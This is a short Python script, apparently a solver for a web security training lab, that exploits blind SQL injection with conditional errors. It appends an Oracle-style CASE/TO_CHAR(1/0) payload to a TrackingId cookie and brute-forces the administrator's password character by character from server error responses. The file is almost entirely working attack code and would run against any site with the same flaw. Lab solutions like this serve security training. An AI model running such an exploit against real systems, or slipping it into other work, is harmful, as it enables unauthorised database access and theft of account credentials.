# Laboratory 12: Blind SQLi with conditional errors
# Author: Emiliano Rivas (RVXS)

import requests, sys, string, urllib3

# If you want to use Burp Suite proxy, uncomment the 2 lines below
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# burp_proxies = {
#     'http' : 'http://127.0.0.1:8080',
#     'https': 'http://127.0.0.1:8080'
# }

def exploit(url):
    password = ""
    chars    = string.ascii_letters + string.digits
    session  = requests.Session()
    session_cookies = session.get(url).cookies.get_dict()

    print(session_cookies) 
    print("\nGetting password ...\n")

    for position in range(1, 21):
        for char in chars:
            payload = "' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator' AND SUBSTR(password,%s,1)='%s' )='a" % (position, char)
            cookies = {
                'TrackingId': session_cookies['TrackingId'] + payload,
                'session': session_cookies['session']
            }

            # Using proxies
            # response = requests.get(url, cookies = cookies, proxies = burp_proxies, verify = False)

            # without proxies
            response = requests.get(url, cookies = cookies)

            if "Internal Server Error" not in response.text:
                sys.stdout.write('\rPassword: ' + password + char)
                sys.stdout.flush()
            else:
                password += char
                sys.stdout.write('\rPassword: ' + password)
                sys.stdout.flush()
                break

def main():
    print("\n-------------------")
    print("WSA Lab-12 Solver")
    print("-------------------\n")

    url = input("Enter the URL: ").strip()
    exploit(url)

if __name__ == "__main__":
    main()